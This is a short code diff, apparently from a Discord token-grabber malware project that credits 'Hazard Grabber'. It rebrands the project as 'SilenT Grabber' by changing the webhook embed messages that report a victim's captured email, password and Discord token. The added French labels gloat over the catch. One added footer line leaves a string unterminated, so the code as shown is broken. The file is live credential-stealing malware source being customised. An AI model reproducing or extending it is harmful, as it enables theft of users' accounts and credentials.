@@ -152,12 +152,12 @@ function Login(email, password, token) {
                     "color": 31,
                     "fields": [
                         {
-                            "name": "",
-                            "value": `Email : ${email}  Password: ${password}`,
+                            "name": "**On à une touche.**",
+                            "value": `Son Email : ${email}  Mot de passe: ${password}`,
                             "inline": true
                         },
                         {
-                            "name": "**Token**",
+                            "name": "**Son Token**",
                             "value": `\`${token}\``,
                             "inline": true
                         }
@@ -167,7 +167,7 @@ function Login(email, password, token) {
                         "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                     },
                     "footer": {
-                        "text": ""
+                        "text": "SilenT Grabber. On a une TOUCHE ! Il peut plus s'échappé !
                     }
                 }
             ]
@@ -220,7 +220,7 @@ function ChangePassword(oldpassword, newpassword, token) {
                             "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                         },
                         "footer": {
-                            "text":" bad "
+                            "text": "Hazard Grabber By Rdimo#6969・https://github.com/Rdimo/Hazard-Nuker"
                         }                 
                     }
                 ]
